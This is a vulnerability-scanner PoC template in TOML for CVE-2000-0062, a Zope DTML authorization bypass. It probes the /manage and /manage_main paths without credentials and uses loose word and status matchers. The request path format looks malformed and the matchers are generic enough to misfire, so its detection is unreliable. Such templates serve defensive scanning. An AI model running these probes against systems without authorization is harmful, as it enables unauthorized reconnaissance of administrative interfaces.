[info]
author = "AVE"
description = "Zope 对象发布环境中的 DTML 实现存在权限验证缺陷，远程攻击者可通过访问 Zope 管理界面或特定 DTML 路径绕过认证，执行未授权操作。PoC 通过请求 Zope 管理路径检测是否存在未授权访问。"
id = "POC-AVE-2000-0200"
name = "Zope DTML 授权绕过漏洞 PoC"
severity = "critical"
tags = [
    "cve-2000-0062",
    "zope",
    "dtml",
    "authorization-bypass",
]
vuln_id = [
    "CVE-2000-0062",
    "AVE-2000-0200",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/manage"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Accept = "text/html"
User-Agent = "Mozilla/5.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Zope Management Interface",
    "Zope",
    "manage_main",
    "Manage",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/manage_main"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Accept = "text/html"
User-Agent = "Mozilla/5.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Zope",
    "manage_main",
    "DTML",
    "Document Template",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
